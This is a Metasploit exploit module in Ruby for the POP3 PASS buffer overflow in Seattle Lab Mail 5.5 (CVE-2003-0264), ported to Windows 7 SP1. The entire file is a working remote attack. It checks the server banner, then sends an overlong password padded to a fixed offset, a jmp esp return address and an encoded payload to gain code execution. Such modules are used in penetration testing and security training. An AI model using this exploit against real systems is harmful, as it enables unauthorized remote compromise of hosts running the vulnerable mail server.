##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Seattle Lab Mail 5.5 POP3 Buffer Overflow',
      'Description'    => %q{
        This metasploit module is an updated version of the module written
        by stinko but ported to Windows 7 Service Pack 1. The original module
        can be found here: https://www.exploit-db.com/exploits/16399/

        The original exploit code that this module was ported from is available
        here: http://www.timgalyean.com/slmail-exploit.py
      },
      'Author'         => '0x616163',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2003-0264'],
          ['OSVDB', '11975'],
          ['BID', '7519'],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 450,
          'BadChars' => "\x00\x0a\x0d",
          'MinNops'  => 20,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 7 SP1 x64 (SLMail 5.5)', { 'Ret' => 0x5f4b41e3, 'Offset' => 4654 } ]
        ],
      'DisclosureDate' => 'May 07 2003',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(110)
      ])

  end

  def exploit
    connect

    print_status("Trying #{target.name} using jmp esp at #{"%.8x" % target.ret}")

    banner = sock.get_once || ''
    if banner !~ /^\+OK POP3 server (.*) ready/
      print_error("POP3 server does not appear to be running")
      return
    end

    sock.put("USER #{rand_text_alphanumeric(10)}\r\n")
    banner = sock.get_once
    if banner !~ /^\+OK (.*) welcome here/
      print_error("POP3 server rejected username")
      return
    end

    request = "PASS " + rand_text_alphanumeric(target['Offset']) + [target.ret].pack('V')
    request << payload.encoded
    request << "\r\n"
    sock.put(request)

    handler
    disconnect
  end
end
